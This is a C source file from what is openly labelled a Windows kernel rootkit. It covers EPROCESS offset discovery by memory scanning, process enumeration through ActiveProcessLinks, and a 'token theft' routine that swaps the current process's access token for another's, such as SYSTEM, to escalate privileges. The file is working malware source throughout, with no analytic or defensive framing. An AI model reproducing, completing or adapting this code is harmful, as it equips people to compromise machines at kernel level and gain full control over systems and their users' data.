/*==============================================================================
 * rootkit/src/process.c
 *------------------------------------------------------------------------------
 * EPROCESS offset resolution, process enumeration, and token manipulation.
 *
 * OFFSET RESOLUTION STRATEGY:
 *   We calibrate against PsInitialSystemProcess (PID 4) at DriverEntry:
 *   1. UniqueProcessId:   Scan for ULONG64 == 4, validate LIST_ENTRY consistency
 *   2. ActiveProcessLinks: Immediately follows UniqueProcessId (always)
 *   3. Token:             Use PsReferencePrimaryToken(System) to get token ptr,
 *                         scan EPROCESS for that pointer (masked EX_FAST_REF)
 *   4. ImageFileName:     Scan for "System\0" literal
 *   5. InheritedFromUniqueProcessId: Not reliably locatable; left as 0
 *============================================================================*/
#include "utils.h"

/*==============================================================================
 * GLOBAL STATE
 *============================================================================*/
EPROCESS_OFFSETS g_EprocOffsets = {0};
PEPROCESS        g_SystemProcess = NULL;

/*==============================================================================
 * RESOLVE EPROCESS OFFSETS
 *------------------------------------------------------------------------------
 * Calibrates all offsets against the live kernel's System process.
 * Must be called before any other process operations.
 *
 * Returns:
 *   STATUS_SUCCESS          - All offsets resolved
 *   STATUS_NOT_FOUND        - One or more offsets could not be found
 *============================================================================*/
NTSTATUS resolve_eprocess_offsets(VOID) {
    g_SystemProcess = PsInitialSystemProcess;
    if (!g_SystemProcess) return STATUS_NOT_FOUND;

    PUCHAR p = (PUCHAR)g_SystemProcess;
    ULONG  pid_off = 0;

    /*--- Step 1: Find UniqueProcessId (PID) ---
     * Scan for ULONG64 == 4 (System PID) and validate that the next
     * 16 bytes form a valid LIST_ENTRY (FLINK->BLINK points back). */
    for (ULONG off = 0x100; off < 0x900; off += 8) {
        ULONG64 v = *(ULONG64*)(p + off);
        if (v != 4) continue;  /* Not PID 4 */

        ULONG64 flink = *(ULONG64*)(p + off + 8);
        ULONG64 blink = *(ULONG64*)(p + off + 16);

        /* Validate kernel pointers (canonical address space). */
        if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

        /* FLINK->Blink must point back at our ActiveProcessLinks. */
        ULONG64 back = *(ULONG64*)(flink + 8);
        if (back != (ULONG64)(p + off + 8)) continue;

        pid_off = off;
        break;
    }
    if (!pid_off) return STATUS_NOT_FOUND;

    g_EprocOffsets.UniqueProcessId  = pid_off;
    g_EprocOffsets.ActiveProcessLinks = pid_off + 8;  /* Always immediately after PID */

    /*--- Step 2: Find Token via PsReferencePrimaryToken ---
     * Get System's primary token, then scan for it in EPROCESS. */
    PACCESS_TOKEN sys_token = PsReferencePrimaryToken(g_SystemProcess);
    if (!sys_token) return STATUS_NOT_FOUND;

    ULONG token_off = 0;
    ULONG64 masked_tok = ((ULONG64)sys_token) & ~0x7ULL;  /* Clear EX_FAST_REF low bits */

    for (ULONG off = g_EprocOffsets.ActiveProcessLinks + 0x10;
         off < g_EprocOffsets.ActiveProcessLinks + 0x300; off += 8) {
        ULONG64 v = *(ULONG64*)(p + off);
        if ((v & ~0x7ULL) == masked_tok) { token_off = off; break; }
    }
    PsDereferencePrimaryToken(sys_token);

    if (!token_off) return STATUS_NOT_FOUND;
    g_EprocOffsets.Token = token_off;

    /*--- Step 3: Find ImageFileName ("System\0") --- */
    for (ULONG off = 0x400; off < 0x900 - 16; off++) {
        if (RtlCompareMemory(p + off, "System", 7) == 7) {
            g_EprocOffsets.ImageFileName = off;
            break;
        }
    }
    if (!g_EprocOffsets.ImageFileName) return STATUS_NOT_FOUND;

    /*--- Step 4: InheritedFromUniqueProcessId ---
     * Not reliably locatable across builds; leave 0. */
    g_EprocOffsets.InheritedFromUniqueProcessId = 0;

    RK_DBG("offsets: pid=0x%x links=0x%x token=0x%x image=0x%x",
           g_EprocOffsets.UniqueProcessId,
           g_EprocOffsets.ActiveProcessLinks,
           g_EprocOffsets.Token,
           g_EprocOffsets.ImageFileName);

    return STATUS_SUCCESS;
}

/*==============================================================================
 * ENUMERATE PROCESSES
 *------------------------------------------------------------------------------
 * Walks the ActiveProcessLinks list starting from System process.
 * Writes RK_PROC_ENTRY records to caller buffer.
 *
 * Returns: Number of entries written (max max_entries).
 *============================================================================*/
ULONG enum_processes(RK_PROC_ENTRY* out, ULONG max_entries) {
    if (!g_SystemProcess || !out) return 0;

    PLIST_ENTRY head = rk_active_links(g_SystemProcess);
    PLIST_ENTRY e    = head->Flink;
    ULONG n = 0;

    while (e && e != head && n < max_entries) {
        PEPROCESS proc = (PEPROCESS)((PUCHAR)e - g_EprocOffsets.ActiveProcessLinks);
        RK_PROC_ENTRY* rec = &out[n];

        rec->pid = (u32)(ULONG_PTR)rk_process_id(proc);
        rec->ppid = 0;  /* Parent PID not resolved in this build */
        RtlZeroMemory(rec->image, sizeof(rec->image));
        RtlCopyMemory(rec->image, rk_image_name(proc), 15);
        rec->image[15] = 0;  /* Ensure null-termination */

        n++;
        e = e->Flink;
    }
    return n;
}

/*==============================================================================
 * TOKEN THEFT (PRIVILEGE ESCALATION)
 *------------------------------------------------------------------------------
 * Copies the primary token from a target process (source_pid) into the
 * current process. This effectively grants the current process the same
 * privileges as the target (e.g., SYSTEM if source_pid=4).
 *
 * Mechanism:
 *   1. Reference target's primary token (PsReferencePrimaryToken)
 *   2. Reference current process's primary token
 *   3. Atomically swap the token pointer in current's EPROCESS
 *   4. Dereference old token (our reference)
 *
 * The EX_FAST_REF low 3 bits (refcount) are preserved during swap.
 *============================================================================*/
NTSTATUS elevate_current_to_pid(ULONG source_pid) {
    PEPROCESS target = find_process_by_pid(source_pid);
    if (!target) return STATUS_NOT_FOUND;

    PEPROCESS current = PsGetCurrentProcess();
    PACCESS_TOKEN old_tok = PsReferencePrimaryToken(current);
    PACCESS_TOKEN new_tok = PsReferencePrimaryToken(target);

    if (!new_tok) {
        if (old_tok) PsDereferencePrimaryToken(old_tok);
        return STATUS_UNSUCCESSFUL;
    }

    ULONG64* slot = rk_token_slot(current);
    ULONG64 cur  = *slot;
    ULONG64 nval = ((ULONG64)new_tok) | (cur & 0x7ULL);  /* Preserve refcount bits */

    InterlockedExchange64((volatile LONG64*)slot, (LONG64)nval);

    if (old_tok) PsDereferencePrimaryToken(old_tok);
    return STATUS_SUCCESS;
}

/*==============================================================================
 * FORWARD DECLARATION (defined in dkom.c)
 *============================================================================*/
PEPROCESS find_process_by_pid(ULONG pid);